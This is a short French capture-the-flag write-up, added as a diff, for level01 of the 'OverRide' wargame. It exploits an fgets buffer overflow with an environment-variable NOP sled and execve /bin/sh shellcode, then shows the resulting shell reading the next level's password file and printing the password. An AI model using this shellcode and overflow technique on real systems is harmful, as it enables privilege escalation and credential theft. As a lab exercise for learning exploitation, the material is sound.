@@ -1,0 +1,21 @@
+
+On remarque qu'il y a un overflow sur le deuxieme fgets dans la fonction main. cela nous permet a modifier le eip.
+
+on va mettre nos shellcode dans variable d'env puis on va trouver l'address de ce variable d'env grace a nos petit program qu'on va compiler dans le /tmp
+
+
+export SHELLCODE=`python -c 'print("\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")'`
+level01@OverRide:~$ /tmp/shellcode
+0xffffd85a
+level01@OverRide:~$ python -c 'print("dat_wil\n" + "A"*80+"\x6a\xd8\xff\xff")' > /tmp/test
+level01@OverRide:~$ cat /tmp/test - | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+id
+uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users) groups=1002(level02),100(users),1001(level01)
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
